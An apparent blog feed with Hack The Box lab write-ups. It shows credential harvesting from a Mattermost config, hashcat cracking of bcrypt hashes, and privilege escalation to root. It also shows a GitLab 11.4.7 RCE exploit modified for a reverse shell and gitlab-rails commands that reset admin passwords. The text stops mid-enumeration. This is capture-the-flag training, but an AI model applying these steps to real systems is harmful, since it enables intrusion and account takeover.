&lt;p&gt;Based in the process in execution, app resides in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/mattermost&lt;/code&gt;, where I have found some credentials in the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/mattermost/config/config.json&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SqlSettings&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DriverName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mysql&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSource&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0026readTimeout=30s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0026writeTimeout=30s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSourceReplicas&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSourceSearchReplicas&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MaxIdleConns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ConnMaxLifetimeMilliseconds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3600000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MaxOpenConns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Trace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;AtRestEncryptKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;QueryTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DisableDatabaseSearch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the credentials found (&lt;strong&gt;mmuser:Crack_The_MM_Admin_PW&lt;/strong&gt;) connected to &lt;strong&gt;mattermost&lt;/strong&gt; database and, at users table, found some password hashes, being &lt;strong&gt;root&lt;/strong&gt; the only with &lt;strong&gt;system_admin&lt;/strong&gt; permissions.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [mattermost]&amp;gt; select Username,Password,Roles from Users;
+----------------------------------+--------------------------------------------------------------+--------------------------+
| Username                         | Password                                                     | Roles                    |
+----------------------------------+--------------------------------------------------------------+--------------------------+
| jdoe                             | $2a$10$qmuCH.AHht/dUGLd8ZyxMOMeZl6nU67B5okAiC0Vx44isKs5y6nkq | system_user              |
| surveybot                        |                                                              | system_user              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | system_user              |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | system_user              |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | system_user              |
| channelexport                    |                                                              | system_user              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              |
+----------------------------------+--------------------------------------------------------------+--------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As mentioned in the Internal Team, root’s password wouldn’t be in a dictionary like RockYou but could be a variation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; and that &lt;strong&gt;``hashcat` rules&lt;/strong&gt; could be the way to crack it. After some research found the following syntax:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Created a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;basicpwd.txt&lt;/code&gt; containing string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt;;&lt;/li&gt;
  &lt;li&gt;Used the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;best64.rule&lt;/code&gt; which has one of the most popular password variations.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executing it directly with the correct hash type (3200 - bcrypt), was able to find the password &lt;strong&gt;PleaseSubscribe!21&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 3200 &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;basicpwd.txt &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /usr/share/hashcat/rules/best64.rule
hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...

OpenCL API &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Platform &lt;span class=&quot;c&quot;&gt;#1 [The pocl project]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=============================================================================================================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5847/5911 MB (2048 MB allocatable), 2MCU&lt;/span&gt;

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Zero-Byte
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Hash
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this attack: 64 MB

Dictionary cache built:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: basicpwd.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 1
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 17
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 77
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

&lt;span class=&quot;nv&quot;&gt;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O&lt;/span&gt;.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As root had no SSH access at this box, ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; and was able to connect as him and read the final flag :smiley:.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/opt/mattermost/config&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
Password:
root@Delivery:/opt/mattermost/config# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/
root@Delivery:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&amp;lt;redacted&amp;gt;
root@Delivery:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides root flag, ippsec left us a message in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; file:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I’ve seen several times.  The inspiration for the box is here:&lt;/p&gt;

  &lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c&lt;/code&gt;&lt;/p&gt;

  &lt;p&gt;Keep on hacking! And please don’t forget to subscribe to all the security streamers out there.&lt;/p&gt;

  &lt;p&gt;- ippsec&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hope you guys have enjoyed this box!&lt;/p&gt;

&lt;p&gt;See you at the next post :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Hello guys! This week’s machine will be Delivery, another easy-rated machine from Hack The Box, created by ippsec.</summary></entry><entry><title type="html">Hackthebox write-up: Ready</title><link href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="alternate" type="text/html" title="Hackthebox write-up: Ready" /><published>2021-05-15T13:00:00-03:00</published><updated>2021-05-15T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/05/htb-ready</id><content type="html" xml:base="https://davicruz.com/writeup/2021/05/htb-ready/">&lt;p&gt;Hello guys!&lt;/p&gt;

&lt;p&gt;This week’s machine will be &lt;strong&gt;Ready&lt;/strong&gt;, another median-rated machine from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/27897&quot;&gt;bertolis&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack The Box machines are posted as soon as they’re retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/iCTQUdu.png&quot; alt=&quot;HTB Ready&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This machine had a very interesting resolution, where we’ll exploit a vulnerable version of GitLab Server and then escape docker container in order to obtain root flag.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, we start with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; quick scan, to identify the services currently published on this machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.220
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-27 12:05 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.220
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.078s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit /users /help 
|_/s/ /snippets/new /snippets/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit
| http-title: Sign &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;C2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.65 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5080tcp---http-service&quot;&gt;5080/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;As we can see in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; output, there’s a GitLab Server Community running. Similar to &lt;a href=&quot;/en-US/writeup/2021/04/htb-laboratory/&quot;&gt;Laboratory&lt;/a&gt;, proceeded with an account creation to have access to public repositories in this server that could help us proceed in this box.&lt;/p&gt;

&lt;p&gt;After account creation, no repository was found but noticed that the running GitLab Server version was &lt;strong&gt;11.4.7&lt;/strong&gt;, as we can see in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/V5Oj0fB.png&quot; alt=&quot;Gitlab Version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;After a quick search on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; for the listed version, identified some available exploits that could be used.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit gitlab 11.4.7
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                           |  Path
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
GitLab 11.4.7 - RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                      | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                    | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    | ruby/webapps/49263.py
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the last result (49334.py), noticed that it didn’t allowed us to set the service port, which required some edit, as well as an issue in the payload generation, where was necessary to update the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_port&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_port = args.P&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49334.py &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;                                                                
usage: 49334.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; U &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; G &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; L &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; P

GitLab 11.4.7 RCE

optional arguments:
  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;  show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message and &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; U        GitLab Username/Email
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P        Gitlab Password
  &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; G        Gitlab URL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;without port&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; L        reverse shell ip
  &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; P        reverse shell port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also, was necessary to change the payload used, once it wasn’t exporting the shell in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; session, preventing us from interacting with the machine.&lt;/p&gt;

&lt;p&gt;After these changes, obtained a reverse shell as user &lt;strong&gt;git&lt;/strong&gt; in the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/gitlab-rails/working&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;After initial shell, started enumeration using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linenum.sh&lt;/code&gt;, where the following details called attention:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;App execution inside a docker container, being necessary to escape to the host later.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;There’s a local user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dude&lt;/code&gt; (id=1000), where the user flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; resides in his home directory.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Obtained the GitLab Server credentials dump, where the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; is the only one with privileges, which has the password hash below:&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;username&lt;/th&gt;
          &lt;th&gt;e-mail&lt;/th&gt;
          &lt;th&gt;admin&lt;/th&gt;
          &lt;th&gt;hash&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;root&lt;/td&gt;
          &lt;td&gt;admin@example.com&lt;/td&gt;
          &lt;td&gt;true&lt;/td&gt;
          &lt;td&gt;$2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on the information above, first thing tried was to check the required privileges to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, where we identified that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; user had access, so we’ve collected it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/home/dude&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude  220 Aug 31  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude 3771 Aug 31  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dude dude  655 May 16  2017 .profile
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 dude git    33 Dec  2 10:46 user.txt
git@gitlab:/home/dude&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Next step would be obtaining the root credential to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; flag. As we had his password hash would be easy to crack it or search in internet but, as this task consumes lot of time and resources, decided to skip this for now as this hash wasn’t still publicly known.&lt;/p&gt;

&lt;p&gt;During the enumeration, the information was also shared along with the credential dump:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner ‘user = User.find_by(email: “youruser@example.com”); user.admin = TRUE; user.save!’
Alternatively, you could change the password of any user by running: gitlab-rails runner ‘user = User.find_by(email: “admin@example.com”); user.password = “pass_peass_pass”; user.password_confirmation = “pass_peass_pass”; user.save!’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Based on that, proceeded with the root account password reset as recommended, but no private repository or additional information was found, that could help us succeed on obtaining root’s credentials.&lt;/p&gt;

&lt;p&gt;That said, decided to perform a manual enumeration and, looking for backups in the file system, found a directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/&lt;/code&gt;, that contained several files inside it.&lt;/p&gt;

